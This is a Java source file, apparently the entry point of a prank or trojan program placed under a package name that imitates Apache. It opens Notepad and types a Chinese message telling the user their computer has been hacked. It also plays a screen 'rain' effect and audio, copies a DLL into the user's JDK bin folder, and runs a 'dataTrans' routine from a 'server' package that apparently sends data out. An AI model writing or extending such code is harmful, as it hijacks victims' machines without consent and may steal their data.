package com.apache.view;

import java.awt.AWTException;

import com.apache.server.XZutils;

public class NMMAIN {
	
	
	
	public static void main(String[] args) throws Exception {
		
		Thread thread=new Thread(new Runnable() {
			@Override
			public void run() {
				Tools.startApp("notepad.exe");
				try {
					Tools.paint("小朋友，不要害怕，你的电脑没坏，只是被我黑了");
					new Rain();
				} catch (AWTException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		},"1");
		thread.start();
		
		
//		Thread thread2=new Thread(new Runnable() {
//			@Override
//			public void run() {
//				try {
//					Tools.mouse(2);
//				} catch (AWTException e) {
//					// TODO Auto-generated catch block
//					e.printStackTrace();
//				}
//			}
//		},"1");
//		thread2.start();
		Thread thread3=new Thread(new Runnable() {
			@Override
			public void run() {
				String path=Tools.getJDK();
				try {
					Tools.copyFile("resources/jacob-1.18-M2-x64.dll", path+"/bin");
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}try {
					Tools.read("小朋友，不要害怕，你的电脑没坏，只是被我黑了。我是浪曦吴彦祖，哈哈哈哈哈！");
				}catch (Exception e) {
					// TODO: handle exception
				}
				
				AePlayWave apw=new AePlayWave("resources/bgm.wav");
		        apw.start();
			}
		},"1");
		thread3.start();
		Thread thread4=new Thread(new Runnable() {
			@Override
			public void run() {
				try {
					XZutils.dataTrans();
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				
			}
		},"1");
		thread4.start();
	
	}
//		new Runnable() {
//			@Override
//			public void run() {
//				Tools.startApp("notepad.exe");
//				try {
//						Tools.paint("����������ĵ��Ա��Һ���");
//					
//				} catch (AWTException e) {
//					// TODO Auto-generated catch block
//					e.printStackTrace();
//				}
//			}
//		}.run();
//		new Runnable() {
//			@Override
//			public void run() {
//				try {
//					Tools.mouse(3);
//				} catch (AWTException e) {
//					// TODO Auto-generated catch block
//					e.printStackTrace();
//				}
//			}
//		}.run();
//	}

}
